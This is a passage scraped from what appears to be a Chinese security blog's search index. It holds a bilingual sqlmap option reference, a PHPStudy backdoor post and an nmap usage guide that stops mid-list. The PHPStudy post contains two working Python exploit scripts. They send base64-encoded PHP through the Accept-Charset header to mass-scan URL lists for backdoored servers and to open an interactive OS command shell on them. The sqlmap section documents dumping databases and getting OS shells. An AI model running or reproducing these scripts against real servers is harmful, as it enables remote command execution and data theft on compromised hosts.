--prefix=PREFIX Injection payload prefix string
## 注入payload字符串前缀
​
--suffix=SUFFIX Injection payload suffix string
## 注入payload字符串后缀
​
--tamper=TAMPER Use given script(s) for tampering injection data
## 使用给定的脚本（S）篡改注入数据
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;detection检测&#34;&gt;Detection（检测）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Detection（检测）:
These options can be used to customize the detection phase
## 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
​
--level=LEVEL Level of tests to perform (1-5, default 1)
## 执行测试的等级（1-5，默认为1）
​
--risk=RISK Risk of tests to perform (1-3, default 1)
## 执行测试的风险（0-3，默认为1）
​
--string=STRING String to match when query is evaluated to True
##  查询时有效时在页面匹配字符串
​
--not-string=NOT.. String to match when query is evaluated to False
## 当查询求值为无效时匹配的字符串
​
--regexp=REGEXP Regexp to match when query is evaluated to True
## 查询时有效时在页面匹配正则表达式
​
--code=CODE HTTP code to match when query is evaluated to True
## 当查询求值为True时匹配的HTTP代码
​
--text-only Compare pages based only on the textual content
## 仅基于在文本内容比较网页
​
--titles Compare pages based only on their titles
##  仅根据他们的标题进行比较

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;techniques技巧&#34;&gt;Techniques（技巧）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Techniques（技巧）:
These options can be used to tweak testing of specific SQL injection techniques
## 这些选项可用于调整具体的SQL注入测试。
​
--technique=TECH SQL injection techniques to use (default &amp;quot;BEUSTQ&amp;quot;)
## SQL 注入技术测试（默认BEUST）
​
--time-sec=TIMESEC Seconds to delay the DBMS response (default 5)
##  DBMS响应的延迟时间（默认为5秒）
​
--union-cols=UCOLS Range of columns to test for UNION query SQL injection
##  定列范围用于测试UNION查询注入
​
--union-char=UCHAR Character to use for bruteforcing number of columns
##  用于暴力猜解列数的字符
​
--union-from=UFROM Table to use in FROM part of UNION query SQL injection
##  要在UNION查询SQL注入的FROM部分使用的表
​
--dns-domain=DNS.. Domain name used for DNS exfiltration attack
##  域名用于DNS漏出攻击
​
--second-order=S.. Resulting page URL searched for second-order response
## 生成页面的URL搜索为second-order响应
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;fingerprint指纹&#34;&gt;Fingerprint（指纹）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Fingerprint（指纹）:
​
-f, --fingerprint Perform an extensive DBMS version fingerprint
## 执行检查广泛的DBMS版本指纹
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;enumeration枚举&#34;&gt;Enumeration（枚举）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Enumeration（枚举）:
​
These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements
## 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。
​
-a, --all Retrieve everything
## 检索一切
​
-b, --banner Retrieve DBMS banner
## 检索数据库管理系统的标识
​
--current-user Retrieve DBMS current user
##  检索数据库管理系统的 标识
​
--current-db Retrieve DBMS current database
## 检索数据库管理系统当前数据库
​
-hostname Retrieve DBMS server hostname
## 检索数据库服务器的主机名
​
--is-dba Detect if the DBMS current user is DBA
## 检测DBMS当前用户是否DBA
​
--users Enumerate DBMS users
## 枚举数据库管理系统用户
​
--passwords Enumerate DBMS users password hashes
## 枚举数据库管理系统用户密码哈希
​
--privileges Enumerate DBMS users privileges
## 枚举数据库管理系统用户的权限
​
--roles Enumerate DBMS users roles
## 枚举数据库管理系统用户的角色
​
--dbs Enumerate DBMS databases
## 枚举数据库管理系统数据库
​
--tables Enumerate DBMS database tables
##  枚举的DBMS数据库中的表
​
--columns Enumerate DBMS database table columns
## 枚举DBMS数据库表列
​
--schema Enumerate DBMS schema
## 枚举数据库架构
​
--count Retrieve number of entries for table(s)
## 检索表的条目数
​
--dump Dump DBMS database table entries
##  转储数据库管理系统的数据库中的表项
​
--dump-all Dump all DBMS databases tables entries
## 转储数据库管理系统的数据库中的表项
​
--search Search column(s), table(s) and/or database name(s)
##  搜索列（S），表（S）和/或数据库名称（S）
​
--comments Retrieve DBMS comments
##  检索数据库的comments(注释、评论)
​
-D DB DBMS database to enumerate
## 要进行枚举的数据库名
​
-T TBL DBMS database table(s) to enumerate
##  要进行枚举的数据库表
​
-C COL DBMS database table column(s) to enumerate
## 要进行枚举的数据库列
​
-X EXCLUDECOL DBMS database table column(s) to not enumerate
## 要不进行枚举的数据库列
​
-U USER DBMS user to enumerate
## 用来进行枚举的数据库用户
​
--exclude-sysdbs Exclude DBMS system databases when enumerating tables
##  枚举表时排除系统数据库
​
--pivot-column=P.. Pivot column name
## 主列名称
​
--where=DUMPWHERE Use WHERE condition while table dumping
## 使用WHERE条件进行表转储
​
--start=LIMITSTART First query output entry to retrieve
##  第一个查询输出进入检索
​
--stop=LIMITSTOP Last query output entry to retrieve
## 最后查询的输出进入检索
​
--first=FIRSTCHAR First query output word character to retrieve
## 第一个查询输出字的字符检索
​
--last=LASTCHAR Last query output word character to retrieve
## 最后查询的输出字字符检索
​
--sql-query=QUERY SQL statement to be executed
## 要执行的SQL语句
​
--sql-shell Prompt for an interactive SQL shell
## 提示交互式SQL的shell
​
--sql-file=SQLFILE Execute SQL statements from given file(s)
## 从给定文件执行SQL语句
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;brute-force蛮力&#34;&gt;Brute Force（蛮力）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Brute force（蛮力）:
​
These options can be used to run brute force checks
## 这些选项可以被用来运行蛮力检查。
​
--common-tables Check existence of common tables
## 检查存在共同表
​
--common-columns Check existence of common columns
## 检查存在共同列
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;user-defined-function-injection用户自定义函数注入&#34;&gt;User-defined function injection（用户自定义函数注入）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;User-defined function injection（用户自定义函数注入）:
​
These options can be used to create custom user-defined functions
## 这些选项可以用来创建用户自定义函数。
​
--udf-inject Inject custom user-defined functions
## 注入用户自定义函数
​
--shared-lib=SHLIB Local path of the shared library
## 共享库的本地路径
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;file-system-access访问文件系统&#34;&gt;File system access（访问文件系统）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;File system access（访问文件系统）:
These options can be used to access the back-end database management system underlying file system
## 这些选项可以被用来访问后端数据库管理系统的底层文件系统。
​
--file-read=RFILE Read a file from the back-end DBMS file system
## 从后端的数据库管理系统文件系统读取文件
​
--file-write=WFILE Write a local file on the back-end DBMS file system
## 编辑后端的数据库管理系统文件系统上的本地文件
​
--file-dest=DFILE Back-end DBMS absolute filepath to write to
## 后端的数据库管理系统写入文件的绝对路径
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;operating-system-access操作系统访问&#34;&gt;Operating system access（操作系统访问）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Operating system access（操作系统访问）:
​
These options can be used to access the back-end database management system underlying operating system
## 这些选项可以用于访问后端数据库管理系统的底层操作系统。
​
--os-cmd=OSCMD Execute an operating system command
## 执行操作系统命令
​
--os-shell Prompt for an interactive operating system shell
##  交互式的操作系统的shell
​
--os-pwn Prompt for an OOB shell, Meterpreter or VNC
## 获取一个OOB shell，meterpreter或VNC
​
--os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC
## 一键获取一个OOB shell，meterpreter或VNC
​
--os-bof Stored procedure buffer overflow exploitation
## 存储过程缓冲区溢出利用
​
--priv-esc Database process user privilege escalation
## 数据库进程用户权限提升
​
--msf-path=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework
## 本地的安装路径
​
--tmp-path=TMPPATH Remote absolute path of temporary files directory
## 远程临时文件目录的绝对路径
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;windows-registry-accesswindows注册表访问&#34;&gt;Windows registry access（Windows注册表访问）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Windows registry access（Windows注册表访问）:
​
These options can be used to access the back-end database management system Windows registry
## 这些选项可以被用来访问后端数据库管理系统Windows注册表。
​
--reg-read Read a Windows registry key value
## 读一个Windows注册表项值
​
--reg-add Write a Windows registry key value data
## 写一个Windows注册表项值数据
​
--reg-del Delete a Windows registry key value
## 删除Windows注册表键值
​
--reg-key=REGKEY Windows registry key
## Windows注册表键
​
--reg-value=REGVAL Windows registry key value
##  Windows注册表项值
​
--reg-data=REGDATA Windows registry key value data
## Windows注册表键值数据
​
--reg-type=REGTYPE Windows registry key value type
## Windows注册表项值类型
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;general一般&#34;&gt;General（一般）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;General（一般）:
​
These options can be used to set some general working parameters
## 这些选项可以用来设置一些一般的工作参数。
​
-s SESSIONFILE Load session from a stored (.sqlite) file
## 保存和恢复检索会话文件的所有数据
​
-t TRAFFICFILE Log all HTTP traffic into a textual file
## 记录所有HTTP流量到一个文本文件中
​
--batch Never ask for user input, use the default behaviour
## 从不询问用户输入，使用所有默认配置。
​
--binary-fields=.. Result fields having binary values (e.g. &amp;quot;digest&amp;quot;)
## 具有二进制值的结果字段
​
--charset=CHARSET Force character encoding used for data retrieval
## 强制用于数据检索的字符编码
​
--crawl=CRAWLDEPTH Crawl the website starting from the target URL
## 从目标网址开始抓取网站
​
--crawl-exclude=.. Regexp to exclude pages from crawling (e.g. &amp;quot;logout&amp;quot;)
## 正则表达式排除网页抓取
​
--csv-del=CSVDEL Delimiting character used in CSV output (default &amp;quot;,&amp;quot;)
## 分隔CSV输出中使用的字符
​
--dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE)
## 转储数据的格式
​
--eta Display for each output the estimated time of arrival
## 显示每个输出的预计到达时间
​
--flush-session Flush session files for current target
## 刷新当前目标的会话文件
​
--forms Parse and test forms on target URL
## 在目标网址上解析和测试表单
​
--fresh-queries Ignore query results stored in session file
## 忽略在会话文件中存储的查询结果
​
--hex Use DBMS hex function(s) for data retrieval
## 使用DBMS hex函数进行数据检索
​
--output-dir=OUT.. Custom output directory path
## 自定义输出目录路径
​
--parse-errors Parse and display DBMS error messages from responses
## 解析和显示响应中的DBMS错误消息
​
--save=SAVECONFIG Save options to a configuration INI file
## 保存选项到INI配置文件
​
--scope=SCOPE Regexp to filter targets from provided proxy log
## 使用正则表达式从提供的代理日志中过滤目标
​
--test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW)
## 根据有效负载和/或标题(e.g. ROW)选择测试
​
--test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK)
## 根据有效负载和/或标题跳过测试（e.g. BENCHMARK）
​
--update Update sqlmap
## 更新SqlMap

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;miscellaneous杂项&#34;&gt;Miscellaneous（杂项）&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Miscellaneous（杂项）:
​
-z MNEMONICS Use short mnemonics (e.g. &amp;quot;flu,bat,ban,tec=EU&amp;quot;)
## 使用简短的助记符
​
--alert=ALERT Run host OS command(s) when SQL injection is found
## 在找到SQL注入时运行主机操作系统命令
​
--answers=ANSWERS Set question answers (e.g. &amp;quot;quit=N,follow=N&amp;quot;)
## 设置问题答案
​
--beep Beep on question and/or when SQL injection is found
## 发现SQL 注入时提醒
​
--cleanup Clean up the DBMS from sqlmap specific UDF and tables SqlMap
## 具体的UDF和表清理DBMS
​
--dependencies Check for missing (non-core) sqlmap dependencies
## 检查是否缺少（非内核）sqlmap依赖关系
​
--disable-coloring Disable console output coloring
## 禁用控制台输出颜色
​
--gpage=GOOGLEPAGE Use Google dork results from specified page number
## 使用Google dork结果指定页码
​
--identify-waf Make a thorough testing for a WAF/IPS/IDS protection
## 对WAF / IPS / IDS保护进行全面测试
​
--skip-waf Skip heuristic detection of WAF/IPS/IDS protection
## 跳过启发式检测WAF / IPS / IDS保护
​
--mobile Imitate smartphone through HTTP User-Agent header
##  通过HTTP User-Agent标头模仿智能手机
​
--offline Work in offline mode (only use session data)
## 在离线模式下工作（仅使用会话数据）
​
--page-rank Display page rank (PR) for Google dork results
##  Google dork结果显示网页排名（PR）
​
--purge-output Safely remove all content from output directory
##  安全地从输出目录中删除所有内容
​
--smart Conduct thorough tests only if positive heuristic(s)
## 只有在正启发式时才进行彻底测试
​
--sqlmap-shell Prompt for an interactive sqlmap shell
## 提示交互式 sqlmap shell
​
--wizard Simple wizard interface for beginner users
## 给初级用户的简单向导界面
&lt;/code&gt;&lt;/pre&gt;
">sqlmap基本使用</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/phpstudy-hou-men-rec-pi-liang-li-yong-jiao-ben/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;北京时间9月20日，杭州公安发布《杭州警方通报打击涉网违法犯罪暨‘净网2019’专项行动战果》一文，文章曝光了国内知名PHP调试环境程序集成包“PhpStudy软件”遭到黑客篡改并植入“后门”。截至案发，近百万PHP用户中超过67万用户已被黑客控制，并大肆盗取账号密码、聊天记录、设备码类等敏感数据多达10万多组，非法牟利600多万元。&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;批量检测&#34;&gt;批量检测&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
import base64

import requests

import threading

import threadpool

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

files=input(&#39;files:\n&#39;)

def write_shell(url):

    payload = &amp;quot;echo md5(123);&amp;quot;

    payload = base64.b64encode(payload.encode(&#39;utf-8&#39;))

    headers = {

    &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,

    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&#39;,

    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#39;,

    &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.9&#39;,

    &#39;accept-charset&#39;: payload,

    &#39;Accept-Encoding&#39;: &#39;gzip,deflate&#39;,

    &#39;Connection&#39;: &#39;close&#39;,

}

    try:

        r = requests.get(url=url+&#39;/index.php&#39;, headers=headers, verify=False,timeout=10)

        if &amp;quot;202cb962ac59075b964b07152d234b70&amp;quot; in r.text:

            print (&#39;[ + ] BackDoor successful: &#39;+url+&#39;===============[ + ]\n&#39;)

            with open(files+&#39;.success.txt&#39;,&#39;a&#39;) as f:

                    f.write(url+&#39;\n&#39;)

        else:

            print (&#39;[ - ] BackDoor failed: &#39;+url+&#39;[ - ]\n&#39;)

    except:

        print (&#39;[ - ] Timeout: &#39;+url+&#39; [ - ]\n&#39;)



def main():

    with open(files,&#39;r&#39;) as f:

        lines = f.read().splitlines()

        task_pool=threadpool.ThreadPool(10)

        requests=threadpool.makeRequests(write_shell,lines)

    for req in requests:

        task_pool.putRequest(req)

        task_pool.wait()

if __name__ == &#39;__main__&#39;:

    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;交互shell&#34;&gt;交互Shell&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
import base64
import requests
import threading
import threadpool
import re

print(&amp;quot;======Phpstudy Backdoor Exploit---os-shell============\n&amp;quot;)
print(&amp;quot;===========By  Qing=================\n&amp;quot;)
print(&amp;quot;=====Blog：https://www.cnblogs.com/-qing-/==\n&amp;quot;)

def os_shell(url,headers,payload):
    try:
        r = requests.get(url=url+&#39;/phpinfo.php&#39;,headers=headers,verify=False,timeout=10)
        # print(r.text)
        res = re.findall(&amp;quot;qing(.*?)qing&amp;quot;,r.text,re.S)
        print(&amp;quot;[ + ]===========The Response:==========[ + ]\n&amp;quot;)
        res = &amp;quot;&amp;quot;.join(res)
        print(res)
    except:
        print(&amp;quot;[ - ]===========Failed! Timeout...==========[ - ]\n&amp;quot;)

def main():
    url = input(&amp;quot;input the Url , example:\&amp;quot;http://127.0.0.1/\&amp;quot;\n&amp;quot;)
    payload = input(&amp;quot;input the payload , default:echo system(\&amp;quot;whoami\&amp;quot;);\n&amp;quot;)
    de_payload = &amp;quot;echo \&amp;quot;qing\&amp;quot;;system(\&amp;quot;whoami\&amp;quot;);echo \&amp;quot;qing\&amp;quot;;&amp;quot;
    if payload.strip() == &#39;&#39;:
        payload = de_payload
    payload = &amp;quot;echo \&amp;quot;qing\&amp;quot;;&amp;quot;+payload+&amp;quot;echo \&amp;quot;qing\&amp;quot;;&amp;quot;
    payload = base64.b64encode(payload.encode(&#39;utf-8&#39;))
    payload = str(payload, &#39;utf-8&#39;)
    headers = {
    &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,
    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&#39;,
    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#39;,
    &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.9&#39;,
    &#39;accept-charset&#39;: payload,
    &#39;Accept-Encoding&#39;: &#39;gzip,deflate&#39;,
    &#39;Connection&#39;: &#39;close&#39;,
    }
    os_shell(url=url,headers=headers,payload=payload)
if __name__ == &#39;__main__&#39;:
    main()

&lt;/code&gt;&lt;/pre&gt;
">PHPStudy后门rec批量利用脚本</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/nmap-ji-ben-shi-yong/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;Nmap 是个端口扫描器，这意味着它可以向一些指定 IP 的 TCP 或 UDP 端口发送封包，并检查是否有响应。如果有的话，这意味着端口是打开的，因此，端口上运行着服务&lt;/p&gt;
&lt;p&gt;Nmap代表Network Mapper，是一款用于网络探索和安全审计的开源工具，它与Kali Linux标准兼容，但也可用于Windows，OSX和许多其他UNIX平台。Nmap还有一个称为Zenmap的图形用户界面。&lt;/p&gt;
&lt;!--more--&gt;
&lt;h4 id=&#34;打开端口扫描和操作系统检测&#34;&gt;打开端口扫描和操作系统检测&lt;/h4&gt;
&lt;p&gt;使用以下命令确定活动主机：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap -sP 192.168.0.0-100
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用以下命令在其中一个实时主机上启动带有操作系统检测的SYN扫描&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap -sS [IP地址] -O
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用以下命令启动一个开放端口扫描和版本检测&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap -sV 192.168.0.1 -A
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将-v添加到命令中时，可以增加冗长度&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap -sV 192.168.0.13 -A -v
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;服务器是否响应-ping或者服务器是否打开&#34;&gt;服务器是否响应 ping，或者服务器是否打开&lt;/h4&gt;
&lt;p&gt;使用-sn参数，我们让 Nmap 只检查是否服务器响应 ICMP 请求（或 ping）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap -sn 192.168.56.102
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;打开了哪些端口&#34;&gt;打开了哪些端口&lt;/h4&gt;
&lt;p&gt;调用 Nmap 的最简方式，它只指定目标 IP。所做的事情是先 ping 服务器，如果它响应了，Nmap 会向 1000 个 TCP 端口列表发送探针，来观察哪个端口响应，之后报告响应端口的结果&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap 192.168.56.102
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;nmap-向服务器询问正在运行的服务的版本并且基于它猜测操作系统&#34;&gt;Nmap 向服务器询问正在运行的服务的版本，并且基于它猜测操作系统&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;sV请求每个被发现的开放端口的标识（头部或者自我识别），这是它用作版本的东西。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;O告诉 Nmap，尝试猜测运行在目标上的操作系统。使用开放端口和版本收集的信息。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;nmap -sV -O 192.168.56.10
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;更加清楚的查看这个端口并且看看可以确认什么&#34;&gt;更加清楚的查看这个端口，并且看看可以确认什么&lt;/h4&gt;
&lt;p&gt;使用此命令，让 nmap 在主机上的 FTP 端口（-p 21）上运行其默认脚本（-sC）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap -sC 192.168.56.102 -p 21
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;nmap-包含了一些脚本用于测试-waf-的存在&#34;&gt;Nmap 包含了一些脚本，用于测试 WAF 的存在&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;map -p 80,443 --script=http-waf-detect 192.168.56.102
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;另一个-nmap-脚本可以帮助我们识别所使用的设备并更加精确&#34;&gt;另一个 Nmap 脚本，可以帮助我们识别所使用的设备，并更加精确&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;nmap -p 80,443 --script=http-waf-fingerprint www.example.com
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;有一些其它的实用参数&#34;&gt;有一些其它的实用参数：&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;sT：通常，在 root 用户下运行 Nmap 时，它使用 SYN 扫描类型。使用这个参数，我们就强制让扫描器执行完全连接的扫描。它更慢，并且会在服务器的日志中留下记录，但是它不太可能被入侵检测系统检测到。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Pn：如果我们已经知道了主机是活动的或者不响应 ping，我们可以使用这个参数告诉 Nmap 跳过 ping 测试，并扫描所有指定目标，假设它们是开启的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;v：这会开启详细模式。Nmap 会展示更多关于它所做事情和得到回复的信息。参数可以在相同命令中重复多次：次数越多，就越详细（也就是说，-vv或-v -v -v -v）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;p N1,N2,Nn：如果我们打算测试特定端口或一些非标准端口，我们可能想这个参数。N1到Nn是打算让 Nmap 扫描的端口。例如，要扫描端口 21，80 到 90，和 137，参数应为：-p 21,80-90,137。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;--script=script_name：Nmap 包含很多实用的漏洞检测、扫描和识别、登录测试、命令执行、用户枚举以及其它脚本。使用这个参数来告诉 Nmap 在目标的开放端口上运行脚本。查看一些 Nmap 脚本，它们在：https://nmap.org/nsedoc/scripts/。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;nmap选项摘要&#34;&gt;Nmap选项摘要&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;用法：nmap [扫描类型] [选项] {目标规格}&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;目标规格&#34;&gt;目标规格：&lt;/h4&gt;
&lt;p&gt;可以传递主机名，IP地址，网络等。&lt;br&gt;
例如：scanme.nmap.org，microsoft.com/24,192.168.0.1; 10.0.0-255.1-254&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-iL &lt;inputfilename&gt;：从主机/网络列表中输入&lt;/li&gt;
&lt;li&gt;-iR &lt;num hosts&gt;：选择随机目标&lt;/li&gt;
&lt;li&gt;-exclude &amp;lt;host1 [，host2] [，host3]，…&amp;gt;：排除主机/网络&lt;/li&gt;
&lt;li&gt;-excludefile &amp;lt;exclude_file&amp;gt;：从文件中排除列表&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;主机发现&#34;&gt;主机发现：&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;-sL：列表扫描 – 仅列出要扫描的目标&lt;/li&gt;
&lt;li&gt;-sn：Ping扫描 – 禁用端口扫描&lt;/li&gt;
&lt;li&gt;-Pn：将所有主机视为联机 – 跳过主机发现&lt;/li&gt;
&lt;li&gt;-PS / PA / PU / PY [portlist]：TCP SYN / ACK / UDP / SCTP发现到指定端口&lt;/li&gt;
&lt;li&gt;-PE / PP / PM：ICMP回显，时间戳和网络掩码请求发现探测&lt;/li&gt;
&lt;li&gt;-PO [协议列表]：IP协议Ping&lt;/li&gt;
&lt;li&gt;-n / -R：从不执行DNS解析/总是解析[默认：有时]&lt;/li&gt;
&lt;li&gt;-dns-servers &amp;lt;serv1 [，serv2]，…&amp;gt;：指定自定义DNS服务器&lt;/li&gt;
&lt;li&gt;-system-dns：使用操作系统的DNS解析器&lt;/li&gt;
&lt;li&gt;-traceroute：每个主机的跟踪跳转路径&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;scan技术&#34;&gt;SCAN技术：&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;-sS / sT / sA / sW / sM：TCP SYN / Connect（）/ ACK / Window / Maimon扫描&lt;/li&gt;
&lt;li&gt;-sU：UDP 扫描-sN&lt;/li&gt;
&lt;li&gt;/ sF / sX：TCP Null，FIN和Xmas扫描&lt;/li&gt;
&lt;li&gt;–scanflags &amp;lt; flags&amp;gt;：自定义TCP扫描标志&lt;/li&gt;
&lt;li&gt;-sI &amp;lt;zombie host [：probeport]&amp;gt;：空闲扫描&lt;/li&gt;
&lt;li&gt;-sY / sZ：SCTP INIT / COOKIE-ECHO扫描&lt;/li&gt;
&lt;li&gt;-sO：IP协议扫描&lt;/li&gt;
&lt;li&gt;-b &amp;lt;FTP中继主机&amp;gt;：FTP反弹扫描&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;端口规格和扫描-顺序-p&#34;&gt;端口规格和扫描 顺序：-p&lt;/h4&gt;
&lt;p&gt;&amp;lt;端口范围&amp;gt;：仅扫描指定的端口&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;例如：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080，S：9&lt;/li&gt;
&lt;li&gt;-exclude-ports &amp;lt;端口范围&amp;gt;：从扫描中排除指定端口&lt;/li&gt;
&lt;li&gt;-F：快速模式 – 扫描端口少于默认扫描&lt;/li&gt;
&lt;li&gt;-r：连续扫描端口 – 不随机化&lt;/li&gt;
&lt;li&gt;-top-ports &lt;number&gt;：扫描&lt;number&gt;最常用的端口&lt;/li&gt;
&lt;li&gt;-port-ratio &lt;ratio&gt;：扫描比&lt;ratio&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;服务版本检测&#34;&gt;服务/版本检测：&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;-sV：探测开放端口以确定服务/版本info&lt;/li&gt;
&lt;li&gt;-version-intensity &lt;level&gt;：设置从0（亮）到9（尝试所有探测器）&lt;/li&gt;
&lt;li&gt;-version-light：限制最可能的探测器2）&lt;/li&gt;
&lt;li&gt;-version-all：尝试每个探测器（强度9）&lt;/li&gt;
&lt;li&gt;-version-trace：显示详细版本的扫描活动（用于调试）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;script-scan&#34;&gt;SCRIPT SCAN：&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;-sC：相当于-script =默认&lt;/li&gt;
&lt;li&gt;-script = &amp;lt;Lua脚本&amp;gt;：&lt;Lua scripts&gt;是逗号分隔的&lt;/li&gt;
&lt;li&gt;目录列表，脚本文件或脚本类别&lt;/li&gt;
&lt;li&gt;-script-args = &amp;lt;n1 = v1，[ n2 = v2，…]&amp;gt;：为脚本提供参数&lt;/li&gt;
&lt;li&gt;-script-args-file = filename：在文件中提供NSE脚本参数&lt;/li&gt;
&lt;li&gt;-script-trace：显示所有发送和接收的数据&lt;/li&gt;
&lt;li&gt;-script-updatedb：更新脚本数据库。&lt;/li&gt;
&lt;li&gt;-script-help = &lt;Lua scripts&gt;：显示有关脚本的帮助。&lt;/li&gt;
&lt;li&gt;&lt;Lua scripts&gt;是脚本文件或&lt;/li&gt;
&lt;li&gt;脚本类别的逗号分隔列表。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;操作系统检测&#34;&gt;操作系统检测：&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;-O：启用操作系统检测&lt;/li&gt;
&lt;li&gt;-osscan-limit：限制操作系统检测为有前途的目标&lt;/li&gt;
&lt;li&gt;-osscan-guess：猜测操作系统更积极&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;时间和性能&#34;&gt;时间和性能：&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;采用&lt;code&gt;&amp;lt;time&amp;gt;&lt;/code&gt;的选项以秒为单位，或附加’ms’（毫秒），‘s’（秒），’m’（分钟）或’h’（小时） ）。&lt;/li&gt;
&lt;li&gt;-T &amp;lt;0-5&amp;gt;：设置定时模板（更高更快）&lt;/li&gt;
&lt;li&gt;-min-hostgroup / max-hostgroup &lt;size&gt;：并行主机扫描组大小&lt;/li&gt;
